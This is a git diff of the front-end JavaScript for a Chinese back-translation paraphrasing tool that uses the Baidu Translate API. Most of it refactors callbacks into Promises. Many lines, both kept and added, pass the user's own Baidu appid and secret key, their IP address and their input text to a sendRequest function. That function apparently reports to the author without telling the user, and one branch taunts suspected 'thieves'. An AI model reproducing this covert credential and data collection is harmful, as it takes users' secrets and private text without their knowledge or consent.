@@ -22,8 +22,7 @@ let timer = null;
 $("#yourAppid").val(appid);
 $("#yourKey").val(key);
 
-
-if (localStorage.getItem('sTimes') >= 0) {
+if (localStorage.getItem('sTimes') != null && localStorage.getItem('sTimes') >= 0 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
 	countTime1();
 } else {
 	if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
@@ -44,7 +43,6 @@ if (localStorage.getItem('sTimes') >= 0) {
 		}
 	}
 }
-
 
 $("#saveBtn").click(() => {
 	const fn = () => {
@@ -96,7 +94,7 @@ $("#saveBtn").click(() => {
 								localStorage.setItem("sTimes", 0);
 								$("#yourAppid").val("");
 								$("#yourKey").val("");
-								sendRequest("盗用: "+localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "盗用 API 被我抓到了吧！IP 地址：" + kehu_ip, 1);
+								sendRequest("盗用: " + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "盗用 API 被我抓到了吧！IP 地址：" + kehu_ip, 1);
 							} else {
 								if (localStorage.getItem("sTimes") != -1 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
 									localStorage.setItem('sTimes', -2)
@@ -150,8 +148,10 @@ $(".clear").click(() => {
 		$("#zifu").text("0");
 		$(".tongji").detach();
 		$(".originData").val("");
-		$(".lead").text("此处将会显示翻译结果")
-		$(".compareRes").text("此处将会显示对比结果")
+		// $(".lead").text("此处将会显示翻译结果")
+		$(".lead").text("")
+		// $(".compareRes").text("此处将会显示对比结果")
+		$(".compareRes").text("")
 	}
 	if (timer !== null) {
 		clearTimeout(timer);
@@ -196,7 +196,7 @@ $(".translateBtn").click(() => {
 							} else {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip + to.val(), 2);
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
 							translateMain(0);
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
@@ -211,7 +211,7 @@ $(".translateBtn").click(() => {
 						} else {
 							showToast("正在翻译中...请耐心等待", 2500);
 						}
-						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip +  to.val(), 2);
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
 						translateMain(0);
 					}
 				} else {
@@ -264,7 +264,7 @@ $(".translateAndCompareBtn").click(() => {
 							} else {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + ' \\ ' +"IP 地址：" + kehu_ip + to.val(), 2);
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + ' \\ ' + "IP 地址：" + kehu_ip + to.val(), 2);
 							translateMain(1);
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
@@ -279,7 +279,7 @@ $(".translateAndCompareBtn").click(() => {
 						} else {
 							showToast("正在翻译中...请耐心等待", 2500);
 						}
-						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip +  to.val(), 2);
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
 						translateMain(1);
 					}
 				} else {
@@ -317,7 +317,7 @@ $(".compare").click(() => {
 })
 
 var restartTimes = 0;
-$(".restart").on("click", function () {
+$(".restart").on("click", function() {
 	showToast("正在重试...", 2500);
 	from.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -327,7 +327,7 @@ $(".restart").on("click", function () {
 	translateZeroFn();
 });
 
-$(".restart1").on("click", function () {
+$(".restart1").on("click", function() {
 	showToast("正在重试...", 2500);
 	from1.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -337,7 +337,7 @@ $(".restart1").on("click", function () {
 	translateOneFn();
 });
 
-$(".restart2").on("click", function () {
+$(".restart2").on("click", function() {
 	showToast("正在重试...", 2500);
 	from2.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -347,7 +347,7 @@ $(".restart2").on("click", function () {
 	translateTwoFn();
 });
 
-$(".restart3").on("click", function () {
+$(".restart3").on("click", function() {
 	showToast("正在重试...", 2500);
 	from3.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -357,7 +357,7 @@ $(".restart3").on("click", function () {
 	translateThreeFn();
 });
 
-$(".restart4").on("click", function () {
+$(".restart4").on("click", function() {
 	showToast("正在重试...", 2500);
 	from4.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -367,7 +367,7 @@ $(".restart4").on("click", function () {
 	translateFourFn();
 });
 
-$(".restart5").on("click", function () {
+$(".restart5").on("click", function() {
 	showToast("正在重试...", 2500);
 	from5.html("正在重试...");
 	if (restartTimes <= 5) {
@@ -377,301 +377,352 @@ $(".restart5").on("click", function () {
 	translateFiveFn();
 });
 
+
+function queryFormatFn(rs) {
+	return String(rs).replace(/^[“]+/, "").replace(/[”]$/, "");
+}
+
+var showTip = 0;
+
+function translateFn(QUERY, FROM, TO) {
+	return new Promise((resolve, reject) => {
+		const salt = (new Date()).getTime();
+		const str1 = appid + QUERY + salt + key;
+		const sign = MD5.main(str1);
+		if (showTip < 4) {
+			setTimeout(() => {
+				$.ajax({
+					url,
+					type: 'get',
+					// async: true,
+					// 跨域
+					dataType: 'jsonp',
+					contentType: "application/x-www-form-urlencoded; charset=utf-8",
+					data: {
+						q: QUERY,
+						appid: appid,
+						salt: salt,
+						from: FROM,
+						to: TO,
+						sign: sign,
+					}
+				}).done(data => {
+					if (data.error_code == "52003") {
+						showToast("账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
+						sendRequest('showTip: ' + showTip + ' \\ ' + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "封装的翻译API && 账号配置出错，请重新配置... &&" + localStorage.getItem("key1"), 1);
+						showTip++;
+					} else if (data.error_code == "54003") {
+						showToast("由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
+						reject(data.error_code);
+					} else {
+						if (data.trans_result[0] != undefined) {
+							resolve(data.trans_result[0].dst)
+						} else {
+							return;
+						}
+					}
+				})
+			}, 1500);
+		} else {
+			showToast("不要太着急，请先休息几分钟，再刷新页面吧~", 5000);
+		}
+	})
+}
+
 var errorTimes = 0;
 // zh-en-zh
-function translateZeroFn(fn = 0) {
-	translateFn(to.val(), 'zh', 'en', (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					from.html(rs);
-					from.css("color", "black");
-					from.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-					if (fn) {
-						setTimeout(() => {
-							compareMain("from");
-						}, 1000);
-					}
-				} else {
-					from.html('修改失败，请稍后重试......');
-					from.css("color", "red");
-					$(".restart").css("display", "inline-block");
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error-1:" + rs, 1);
-					}
-					errorTimes++;
+
+function translateZeroFn(fn) {
+	translateFn(to.val(), "zh", "en").then((rs) => {
+		translateFn(queryFormatFn(rs), "en", "zh").then((rs) => {
+			from.html(rs);
+			from.css("color", "black");
+			from.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+			if (fn) {
+				setTimeout(() => {
+					compareMain("from");
+				}, 1000);
+			}
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				console.log(err);
+				from.html('修改失败，请稍后重试......');
+				from.css("color", "red");
+				$(".restart").css("display", "inline-block");
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error-1:" + err, 1);
 				}
-			});
-		} else {
+				errorTimes++;
+			}
+		});
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			console.log(err);
 			from.html('修改失败，请稍后重试......');
 			from.css("color", "red");
 			$(".restart").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error:" + rs, 1)
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error:" + err, 1)
 			}
 			errorTimes++;
 		}
-	});
+	})
 }
 
 // zh-jp-zh
-function translateOneFn(fn = 0) {
-	translateFn(to.val(), 'zh', 'jp', (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "jp", "zh", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					from1.html(rs);
-					from1.css("color", "black");
-					from1.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-					if (fn) {
-						setTimeout(() => {
-							compareMain("from1");
-						}, 1000);
-					}
-				} else {
-					from1.html('修改失败，请稍后重试......');
-					from1.css("color", "red");
-					$(".restart1").css("display", "inline-block");
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1-1:" + rs, 1);
-					}
-					errorTimes++;
+function translateOneFn(fn) {
+	translateFn(to.val(), 'zh', 'jp').then((rs) => {
+		translateFn(queryFormatFn(rs), "jp", "zh").then((rs) => {
+			from1.html(rs);
+			from1.css("color", "black");
+			from1.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+			if (fn) {
+				setTimeout(() => {
+					compareMain("from1");
+				}, 1000);
+			}
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				console.log(err);
+				from1.html('修改失败，请稍后重试......');
+				from1.css("color", "red");
+				$(".restart1").css("display", "inline-block");
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1-1:" + err, 1);
 				}
-			});
-		} else {
+				errorTimes++;
+			}
+		});
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			console.log(err);
 			from1.html('修改失败，请稍后重试......');
 			from1.css("color", "red");
 			$(".restart1").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1:" + rs, 1)
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1:" + err, 1)
 			}
 			errorTimes++;
 		}
-	});
+	})
 }
 
 // zh-it-zh
-function translateTwoFn(fn = 0) {
-	translateFn(to.val(), 'zh', 'it', (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "it", "zh", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					from2.html(rs);
-					from2.css("color", "black");
-					from2.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-					if (fn) {
-						setTimeout(() => {
-							compareMain("from2")
-						}, 1000);
-					}
-				} else {
-					from2.html('修改失败，请稍后重试......');
-					from2.css("color", "red");
-					$(".restart2").css("display", "inline-block")
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2-1:" + rs, 1)
-					}
+function translateTwoFn(fn) {
+	translateFn(to.val(), 'zh', 'it').then((rs) => {
+		translateFn(queryFormatFn(rs), "it", "zh").then((rs) => {
+			from2.html(rs);
+			from2.css("color", "black");
+			from2.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+			if (fn) {
+				setTimeout(() => {
+					compareMain("from2")
+				}, 1000);
+			}
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				console.log(err);
+				from2.html('修改失败，请稍后重试......');
+				from2.css("color", "red");
+				$(".restart2").css("display", "inline-block")
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2-1:" + err, 1)
 				}
-			});
-		} else {
+			}
+		})
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			console.log(err);
 			from2.html('修改失败，请稍后重试......');
 			from2.css("color", "red");
 			$(".restart2").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2:" + rs, 1)
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2:" + err, 1)
 			}
 			errorTimes++;
 		}
-	});
+	})
 }
 
 //zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
-function translateThreeFn(fn = 0) {
-	translateFn(to.val(), "zh", "fra", (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "en", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "pt", (
-						rs) => {
-						if (rs !== "54003" && rs !== "") {
-							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
-								"pt", "jp", (rs) => {
-									if (rs !== "54003" && rs !== "") {
-										translateFn(to.val(), "jp", "zh", (rs) => {
-											if (rs !== "54003" && rs !== "") {
-												from3.html(rs);
-												from3.css("color", "black");
-												from3.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-												if (fn) {
-													setTimeout(() => {
-														compareMain(
-															"from3")
-													}, 1000);
-												}
-											} else {
-												from3.html("修改失败，请稍后重试......");
-												from3.css("color", "red");
-												$(".restart3").css("display", "inline-block")
-												
-												if(errorTimes<=5){
-												sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-4:" + rs, 1)
-											}
-											errorTimes++;
-											}
-										});
-									} else {
-										from3.html("修改失败，请稍后重试......");
-										from3.css("color", "red");
-										$(".restart3").css("display", "inline-block")
-										
-										if(errorTimes<=5){
-										sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-3:" + rs, 1)
-									}
-									errorTimes++;
-									}
-								});
-						} else {
+function translateThreeFn(fn) {
+	translateFn(to.val(), "zh", "fra").then((rs) => {
+		translateFn(queryFormatFn(rs), "fra", "en").then((rs) => {
+			translateFn(queryFormatFn(rs), "en", "pt").then((rs) => {
+				translateFn(queryFormatFn(rs), "pt", "jp").then((rs) => {
+					translateFn(queryFormatFn(rs), "jp", "zh").then((rs) => {
+						from3.html(rs);
+						from3.css("color", "black");
+						from3.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+						if (fn) {
+							setTimeout(() => {
+								compareMain(
+									"from3")
+							}, 1000);
+						}
+					}, (err) => {
+						if (err == "54003" || err == "") {
 							from3.html("修改失败，请稍后重试......");
 							from3.css("color", "red");
 							$(".restart3").css("display", "inline-block")
-							if(errorTimes<=5){
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-2:" + rs, 1)
-						}
-						errorTimes++;
-						}
-					});
-				} else {
-					from3.html("修改失败，请稍后重试......");
-					from3.css("color", "red");
-					$(".restart3").css("display", "inline-block")
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-1:" + rs, 1)
-					}
-					errorTimes++;
-				}
-			});
-		} else {
-			from3.html("修改失败，请稍后重试......");
-			from3.css("color", "red");
-			$(".restart3").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3:" + rs, 1)
-			}
-			errorTimes++;
-		}
-	});
-}
-
-//zh - de - fra - zh
-function translateFourFn(fn = 0) {
-	translateFn(to.val(), "zh", "de", (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "de", "fra", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from4.html(rs);
-							from4.css("color", "black");
-							from4.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from4")
-								}, 1000);
-							}
-						} else {
-							from4.html("修改失败，请稍后重试......");
-							from4.css("color", "red");
-							$(".restart4").css("display", "inline-block")
-							if(errorTimes<=5){
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-2:" + rs, 1)
+							if (errorTimes <= 5) {
+								sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-4:" + err, 1)
 							}
 							errorTimes++;
 						}
 					})
-				} else {
-					from4.html("修改失败，请稍后重试......");
-					from4.css("color", "red");
-					$(".restart4").css("display", "inline-block")
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-1:" + rs, 1)
+				}, (err) => {
+					if (err == "54003" || err == "") {
+						from3.html("修改失败，请稍后重试......");
+						from3.css("color", "red");
+						$(".restart3").css("display", "inline-block")
+						if (errorTimes <= 5) {
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-3:" + err, 1)
+						}
+						errorTimes++;
+					}
+				})
+			}, (err) => {
+				if (err == "54003" || err == "") {
+					from3.html("修改失败，请稍后重试......");
+					from3.css("color", "red");
+					$(".restart3").css("display", "inline-block")
+					if (errorTimes <= 5) {
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-2:" + err, 1)
 					}
 					errorTimes++;
 				}
 			})
-		} else {
-			from4.html("修改失败，请稍后重试......");
-			from4.css("color", "red");
-			$(".restart4").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4:" + rs, 1)
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				from3.html("修改失败，请稍后重试......");
+				from3.css("color", "red");
+				$(".restart3").css("display", "inline-block")
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-1:" + err, 1)
+				}
+				errorTimes++;
+			}
+		})
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			from3.html("修改失败，请稍后重试......");
+			from3.css("color", "red");
+			$(".restart3").css("display", "inline-block")
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3:" + err, 1)
 			}
 			errorTimes++;
 		}
-	});
+	})
 }
 
-// zh-en-jp-kor-zh
-function translateFiveFn(fn = 0) {
-	translateFn(to.val(), "zh", "en", (rs) => {
-		if (rs !== "54003" && rs !== "") {
-			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "jp", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "jp", "kor", (
-						rs) => {
-						if (rs !== "54003" && rs !== "") {
-							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
-								"kor",
-								"zh",
-								(rs) => {
-									if (rs !== "54003" && rs !== "") {
-										from5.html(rs);
-										from5.css("color", "black");
-										from5.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
-										if (fn) {
-											setTimeout(() => {
-												compareMain("from5")
-											}, 1000);
-										}
-									} else {
-										from5.html("修改失败，请稍后重试......");
-										from5.css("color", "red");
-										$(".restart5").css("display", "inline-block")
-										if(errorTimes<=5){
-										sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-3:" + rs, 1)
-										}
-										errorTimes++;
-									}
-								});
-						} else {
-							from5.html("修改失败，请稍后重试......");
-							from5.css("color", "red");
-							$(".restart5").css("display", "inline-block")
-							if(errorTimes<=5){
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-2:" + rs, 1)
-							}
-							errorTimes++;
-						}
-					});
-				} else {
-					from5.html("修改失败，请稍后重试......");
-					from5.css("color", "red");
-					$(".restart5").css("display", "inline-block")
-					if(errorTimes<=5){
-					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-1:" + rs, 1)
+//zh - de - fra - zh
+function translateFourFn(fn) {
+	translateFn(to.val(), "zh", "de").then((rs) => {
+		translateFn(queryFormatFn(rs), "de", "fra").then((rs) => {
+			translateFn(queryFormatFn(rs), "fra", "zh").then((rs) => {
+				from4.html(rs);
+				from4.css("color", "black");
+				from4.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+				if (fn) {
+					setTimeout(() => {
+						compareMain("from4")
+					}, 1000);
+				}
+			}, (err) => {
+				if (err == "54003" || err == "") {
+					from4.html("修改失败，请稍后重试......");
+					from4.css("color", "red");
+					$(".restart4").css("display", "inline-block")
+					if (errorTimes <= 5) {
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-2:" + err, 1)
 					}
 					errorTimes++;
 				}
-			});
-		} else {
-			from5.html("修改失败，请稍后重试......");
-			from5.css("color", "red");
-			$(".restart5").css("display", "inline-block")
-			if(errorTimes<=5){
-			sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5:" + rs, 1)
+			})
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				from4.html("修改失败，请稍后重试......");
+				from4.css("color", "red");
+				$(".restart4").css("display", "inline-block")
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-1:" + err, 1)
+				}
+				errorTimes++;
+			}
+		})
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			from4.html("修改失败，请稍后重试......");
+			from4.css("color", "red");
+			$(".restart4").css("display", "inline-block")
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4:" + err, 1)
 			}
 			errorTimes++;
 		}
-	});
+	})
+}
+
+// zh-en-jp-kor-zh
+function translateFiveFn(fn) {
+	translateFn(to.val(), "zh", "en").then((rs) => {
+		translateFn(queryFormatFn(rs), "en", "jp").then((rs) => {
+			translateFn(queryFormatFn(rs), "jp", "kor").then((rs) => {
+				translateFn(queryFormatFn(rs), "kor", "zh").then((rs) => {
+					from5.html(rs);
+					from5.css("color", "black");
+					from5.after("<p class='tongji'>共计：<span>" + tongji(rs) + " </span>字符&emsp;<span class='similarity'>预计相似度：<span>" + allSimilarity(to.val(), rs) + "</span></span></p>");
+					if (fn) {
+						setTimeout(() => {
+							compareMain("from5")
+						}, 1000);
+					}
+				}, (err) => {
+					if (err == "54003" || err == "") {
+						from5.html("修改失败，请稍后重试......");
+						from5.css("color", "red");
+						$(".restart5").css("display", "inline-block")
+						if (errorTimes <= 5) {
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-3:" + err, 1)
+						}
+						errorTimes++;
+					}
+				})
+			}, (err) => {
+				if (err == "54003" || err == "") {
+					from5.html("修改失败，请稍后重试......");
+					from5.css("color", "red");
+					$(".restart5").css("display", "inline-block")
+					if (errorTimes <= 5) {
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-2:" + err, 1)
+					}
+					errorTimes++;
+				}
+			})
+		}, (err) => {
+			if (err == "54003" || err == "") {
+				from5.html("修改失败，请稍后重试......");
+				from5.css("color", "red");
+				$(".restart5").css("display", "inline-block")
+				if (errorTimes <= 5) {
+					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-1:" + err, 1)
+				}
+				errorTimes++;
+			}
+		})
+	}, (err) => {
+		if (err == "54003" || err == "") {
+			from5.html("修改失败，请稍后重试......");
+			from5.css("color", "red");
+			$(".restart5").css("display", "inline-block")
+			if (errorTimes <= 5) {
+				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5:" + err, 1)
+			}
+			errorTimes++;
+		}
+	})
 }
 
 function translateMain(fn = 0) {
@@ -690,53 +741,33 @@ function translateMain(fn = 0) {
 	}, 1500))))));
 }
 
-var showTip = 0;
 
-function translateFn(QUERY, FROM, TO, callback) {
-	const salt = (new Date()).getTime();
-	const str1 = appid + QUERY + salt + key;
-	const sign = MD5.main(str1);
-	if (showTip < 4) {
-		setTimeout(() => {
-			$.ajax({
-				url,
-				type: 'get',
-				// async: true,
-				// 跨域
-				dataType: 'jsonp',
-				contentType: "application/x-www-form-urlencoded; charset=utf-8",
-				data: {
-					q: QUERY,
-					appid: appid,
-					salt: salt,
-					from: FROM,
-					to: TO,
-					sign: sign,
-				},
-				success: (data) => {
-					if (data.error_code == "52003") {
-						showToast("账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
-						sendRequest('showTip: ' + showTip + ' \\ ' + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "封装的翻译API && 账号配置出错，请重新配置... &&" + localStorage.getItem("key1"), 1);
-						showTip++;
-					} else if (data.error_code == "54003") {
-						showToast("由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
-						callback(data.error_code);
-					} else {
-						if (data.trans_result[0] != undefined) {
-							callback(data.trans_result[0].dst)
-						} else {
-							return;
-						}
-					}
-				},
-				error: function (data) {
-					// alert("error:" + data.status);
-				},
-			})
-		}, 1500);
-	} else {
-		showToast("不要太着急，请先休息几分钟，再刷新页面吧~", 5000);
+function compareMain(op) {
+	if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
+		compareFn(compare, to, from)
 	}
+	if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
+		compareFn(compare1, to, from1)
+	}
+	if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
+		compareFn(compare2, to, from2)
+	}
+	if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
+		compareFn(compare3, to, from3)
+	}
+	if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
+		compareFn(compare4, to, from4)
+	}
+	if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
+		compareFn(compare5, to, from5)
+	}
+}
+
+function compareFn(target, originData, newData) {
+	target.html(eq({
+		value1: newData.text(),
+		value2: originData.val()
+	}).value2)
 }
 
 function showToast(msg, duration) {
@@ -775,43 +806,15 @@ function showToast(msg, duration) {
 	var toastLiveExample = document.getElementById('liveToast')
 	var toast = new bootstrap.Toast(toastLiveExample)
 	toast.show();
-	setTimeout(function () {
+	setTimeout(function() {
 		var d = 0.5;
 		m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
 		m.style.opacity = '0';
-		setTimeout(function () {
+		setTimeout(function() {
 			toast.hide();
 			document.body.removeChild(m);
 		}, d * 1000);
 	}, duration);
-}
-
-function compareMain(op) {
